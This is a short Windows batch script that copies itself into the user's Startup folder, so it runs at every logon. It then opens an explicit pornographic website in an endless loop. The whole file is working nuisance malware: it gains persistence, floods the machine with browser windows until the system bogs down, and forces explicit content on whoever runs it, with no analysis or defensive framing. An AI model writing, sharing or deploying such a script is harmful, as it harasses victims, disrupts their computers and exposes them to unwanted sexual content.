@echo off
set "target=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start-sites.bat"

copy "%~f0" "%target%" >nul

:loopstart
start https://gayporn.com
goto loopstart